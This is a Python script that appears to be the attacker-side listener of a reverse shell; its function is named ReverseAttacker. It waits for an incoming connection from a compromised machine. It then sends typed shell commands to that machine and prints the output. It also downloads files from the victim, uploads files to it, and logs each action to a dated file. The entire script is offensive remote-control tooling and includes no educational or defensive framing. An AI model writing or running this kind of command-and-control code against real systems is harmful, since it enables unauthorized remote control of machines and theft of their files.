import socket
import os
from datetime import datetime,date


def Logo(Data):
  with open(f"{date.today()}-Reverse.txt","a") as Log:
    Log.write(f"[{datetime.now()}] {Data}")


def ReverseAttacker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    l=int(input("Enter port: "))
    try:
      s.bind(("localhost",l))
    except Exception as a:
      print(a)
    s.listen(5)
    print("[+] listening ....")
    conn, addr = s.accept()
    print("[*] Connected from: ", addr)
    while True:
        data = input("$: ")
        d=data
        if "down" in data:
            D = data.split()[1]
            conn.send(D.encode())
            dataT = conn.recv(4096)
            if "not" in dataT.decode():
                print(f"[-] Not found file: {D}")
                Logo(f"[-] Not found file: {D}")
            else:
                with open(D, "wb") as f:
                    f.write(dataT)
                    print(f"[*] {D} file is Saved")
                    Logo(f"[*] {D} file is Saved")
            data=d
        if "upload" in data:
            U=data.split()[1]
            conn.send(data.encode())
            try:
                with open(U, "rb") as u:
                    while True:
                        UP = u.read(4096)
                        if not UP:
                            break
                        conn.sendall(UP)
                conn.sendall(b"<END_OF_FILE>")
                print(f"[+] {U} uploaded successfully.")
                Logo(f"[+] {U} uploaded successfully.")
            except FileNotFoundError:
                print(f"[-] Not found file: {U}")
                Logo(f"[-] Not found file: {U}")
            except Exception as e:
                print(f"[-] Error uploading {U}: {e}")
                Logo(f"[-] Error uploading {U}: {e}")
        elif data in [""," "]:
             continue
        else:
            conn.send(data.encode())
            data = conn.recv(4096)
            Logo(data.decode())
            print(data.decode())

#ReverseAttacker()
